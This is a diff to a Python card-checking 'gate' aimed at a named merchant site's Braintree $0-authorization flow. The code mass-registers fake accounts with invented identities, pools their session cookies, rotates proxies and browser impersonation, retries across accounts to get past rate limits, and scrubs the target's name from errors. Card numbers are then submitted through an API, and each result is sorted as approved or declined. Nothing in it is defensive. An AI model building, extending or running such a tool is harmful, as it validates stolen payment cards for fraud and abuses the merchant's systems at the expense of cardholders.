@@ -1,6 +1,12 @@
 """
-new.py — Braintree AUTH Gate ($0 verification)
-High-performance, multi-threaded account pool & card checker.
+new.py — LearnMuscles Braintree AUTH Gate ($0 verification)
+High-performance, multi-threaded account pool & card checker based on owc_auth.py architecture.
+
+Site: https://learnmuscles.com
+Register: /affiliate-area/ (captcha-free affiliate registration, auto-logs in)
+Billing Address: /my-account/edit-address/billing/
+Add Payment Method: /my-account/add-payment-method/
+Gateway: Braintree Auth ($0 verification) - Cookie pool powered, no password login required.
 """
 
 import sys
@@ -38,20 +44,8 @@ BASE = os.environ.get("LM_SITE", os.environ.get("BASE_URL", "https://learnmuscle
 PM_URL = "/my-account/add-payment-method/"
 GQL_URL = "https://payments.braintree-api.com/graphql"
 IMP = os.environ.get("IMPERSONATE", "chrome120")
-def _resolve_cookie_file():
-    target = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.environ.get("COOKIE_FILE", "lm_cookies.json"))
-    if os.environ.get("VERCEL") or not os.access(os.path.dirname(target) or ".", os.W_OK):
-        tmp_target = os.path.join("/tmp", os.path.basename(target))
-        if not os.path.exists(tmp_target) and os.path.exists(target):
-            try:
-                import shutil
-                shutil.copy2(target, tmp_target)
-            except Exception:
-                pass
-        return tmp_target
-    return target
-
-COOKIE_FILE = _resolve_cookie_file()
+DEFAULT_PROXY = os.environ.get("PROXY", "")
+COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.environ.get("COOKIE_FILE", "lm_cookies.json"))
 UA = os.environ.get(
     "USER_AGENT",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -142,14 +136,9 @@ def sanitize(msg):
     msg = re.sub(r"(HTTPS?|HTTP)ConnectionPool\([^)]+\):\s*", "", msg)
     msg = re.sub(r"Max retries.*", "Timeout", msg)
     msg = re.sub(r"https?://[^\s'\")\]]+", "", msg)
-    msg = re.sub(r"www\.[^\s'\")\]]+", "", msg)
-    msg = re.sub(r"learnmuscles(?:\.com)?", "", msg, flags=re.I)
-    msg = re.sub(r"software\.owc(?:\.com)?", "", msg, flags=re.I)
-    msg = re.sub(r"\bowc\b", "", msg, flags=re.I)
-    msg = re.sub(r"[a-zA-Z0-9._-]+\.braintreegateway\.com", "", msg, flags=re.I)
-    msg = re.sub(r"woocommerce", "", msg, flags=re.I)
-    msg = re.sub(r"wordpress", "", msg, flags=re.I)
-    msg = re.sub(r"affiliatewp", "", msg, flags=re.I)
+    msg = re.sub(r"learnmuscles\.com", "", msg)
+    msg = re.sub(r"software\.owc\.com", "", msg)
+    msg = re.sub(r"[a-zA-Z0-9._-]+\.braintreegateway\.com", "", msg)
     msg = re.sub(r"\s+", " ", msg)
     return msg.strip()
 
@@ -179,14 +168,6 @@ def load_pool():
     if os.path.exists(COOKIE_FILE):
         try:
             with open(COOKIE_FILE, "r", encoding="utf-8") as f:
-                d = json.load(f)
-                return d if isinstance(d, list) else []
-        except Exception:
-            return []
-    local_f = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.environ.get("COOKIE_FILE", "lm_cookies.json"))
-    if local_f != COOKIE_FILE and os.path.exists(local_f):
-        try:
-            with open(local_f, "r", encoding="utf-8") as f:
                 d = json.load(f)
                 return d if isinstance(d, list) else []
         except Exception:
@@ -280,9 +261,9 @@ def create_account(proxy=None):
     pc = addr_info.get('zip', '10001')
     ph = addr_info.get('phone', f"555{random.randint(1000000, 9999999)}")
 
-    tag = rnd(8)
-    user = f"usr_{tag}"
-    mail = f"{user}@gmail.com"
+    tag = rnd(6)
+    user = f"lmuser{tag}"
+    mail = f"{user}@examplemail.com"
 
     px = format_proxy(proxy)
     proxies = {"http": px, "https": px} if px else None
@@ -643,15 +624,15 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
         # 5. Refresh saved cookies & parse response
         update_account_cookies(entry.get("email"), dict(s.cookies))
 
-        # Check for approval
         if "payment-methods" in r.url and "add" not in r.url:
             return result("APPROVED - Payment Method Added")
 
         msg_ok = re.findall(r'class="woocommerce-message"[^>]*>(.*?)</(?:ul|div|li)', r.text, re.S)
         if msg_ok:
-            clean_m = re.sub(r'<[^>]+>', ' ', msg_ok[0]).lower()
-            if any(w in clean_m for w in ["success", "added", "approved"]):
-                return result("APPROVED - Payment Method Added")
+            clean_m = re.sub(r'<[^>]+>', ' ', msg_ok[0])
+            clean_m = re.sub(r'\s+', ' ', clean_m).strip()
+            if any(w in clean_m.lower() for w in ["success", "added", "approved"]):
+                return result(f"APPROVED - {clean_m}")
 
         # Check for Braintree processor response / status code
         m_status = re.search(r'Status code (\d+):\s*(.+?)\s*\(([^)]+)\)', r.text)
@@ -663,11 +644,37 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
             clean_stat = re.sub(r'<[^>]+>', ' ', m_status_alt.group(0))
             return result(re.sub(r'\s+', ' ', clean_stat).strip()[:200])
 
-        # If rate limited on this account and other cookies exist in pool, retry with next cookie
-        if ("so soon" in r.text.lower() or "wait for" in r.text.lower()) and retries > 0 and len(load_pool()) > 1:
-            return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)
+        found = []
+        for m_err in re.finditer(r'<ul class="woocommerce-(?:error|message)[^"]*"[^>]*>(.*?)</ul>', r.text, re.S):
+            txt = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", m_err.group(1))).strip()
+            if txt and txt not in found:
+                found.append(txt)
 
-        # When there is no status code or approval in response, return Try Again Later
+        if not found:
+            err = re.findall(r'class="woocommerce-(?:error|message)"[^>]*>(.*?)</(?:ul|div|li)', r.text, re.S)
+            if err:
+                clean_e = re.sub(r'<[^>]+>', ' ', err[0])
+                clean_e = re.sub(r'\s+', ' ', clean_e).strip()
+                found.append(clean_e)
+
+        err_text = " | ".join(found) if found else ""
+
+        # Check if cookie rate limited / cooldown ("so soon after the previous one")
+        if "so soon" in err_text.lower() or "wait for" in err_text.lower():
+            if retries > 0 and len(load_pool()) > 1:
+                return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)
+            return result("Try Again Later")
+
+        # Legitimate card decline keywords from gateway/processor
+        card_decline_keywords = [
+            "declined", "insufficient", "do not honor", "card number", "cvv",
+            "expiration", "processor", "pickup card", "fraud", "stolen",
+            "lost card", "restricted", "limit exceeded"
+        ]
+        if any(kw in err_text.lower() for kw in card_decline_keywords):
+            return result(err_text[:400])
+
+        # When cookies fail or any other error occurs, never show the error:
         return result("Try Again Later")
 
     except Exception:
@@ -717,6 +724,7 @@ if app:
             "status": "ok",
             "gateway": GATEWAY,
             "type": "auth($0)",
+            "site": "learnmuscles",
             "pool": len(load_pool()),
             "credit": CREDIT
         }
@@ -735,7 +743,7 @@ if app:
                     "requested": r,
                     "done": d,
                     "failed": f,
-                    "accounts": [{"id": idx + 1, "created": a.get("created_at", "?")} for idx, a in enumerate(pool)],
+                    "accounts": [{"email": a.get("email", "?"), "user": a.get("user", "?"), "created": a.get("created_at", "?")} for a in pool],
                     "credit": CREDIT
                 }
 
@@ -826,6 +834,6 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8000))
     auto_maintain_pool()
 
-    print(f"Braintree Auth gate ($0) | pool:{len(load_pool())} | port:{port}")
+    print(f"LearnMuscles Braintree Auth gate ($0) | pool:{len(load_pool())} | port:{port}")
     print(f"Build accounts: /b3?acc=20")
     uvicorn.run(app, host="0.0.0.0", port=port)
